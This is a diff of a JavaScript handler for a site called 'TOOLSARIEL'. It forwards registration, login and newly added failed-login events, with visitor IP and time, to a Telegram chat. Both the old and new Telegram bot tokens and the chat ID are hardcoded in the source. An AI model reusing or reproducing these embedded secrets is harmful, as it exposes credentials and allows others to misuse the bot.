@@ -1,4 +1,4 @@
-const TELEGRAM_TOKEN   = "8687640961:AAFRHGV5uGvE71wUtpYgwWczToU3rXpTcdA";
+const TELEGRAM_TOKEN   = "8401137297:AAHWeV0-LKRe67cWsAi_jnTFC5xesH5jSTQ";
 const TELEGRAM_CHAT_ID = "6483043491";
 
 function escapeHtml(str) {
@@ -47,10 +47,15 @@ export default async function handler(req, res) {
         const ip = req.headers["x-forwarded-for"] || "-";
         const time = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
 
-        const isRegister = tipe === "register";
-        const header = isRegister
-            ? "<b>📝 REGISTRASI BARU - TOOLSARIEL</b>"
-            : "<b>🔐 LOGIN BARU - TOOLSARIEL</b>";
+        let header = "";
+
+        if (tipe === "register") {
+            header = "<b>📝 REGISTRASI BARU - TOOLSARIEL</b>";
+        } else if (tipe === "login_gagal") {
+            header = "<b>⚠️ LOGIN GAGAL - TOOLSARIEL</b>";
+        } else {
+            header = "<b>🔐 LOGIN BARU - TOOLSARIEL</b>";
+        }
 
         await sendTelegram(
             header + "\n" +
@@ -62,7 +67,7 @@ export default async function handler(req, res) {
             "<b>🕐 Waktu:</b> " + time
         );
 
-        return res.json({ success: true, message: isRegister ? "Registrasi berhasil" : "Login berhasil" });
+        return res.json({ success: true, message: "Berhasil" });
 
     } catch (err) {
         console.error("Telegram handler error:", err);
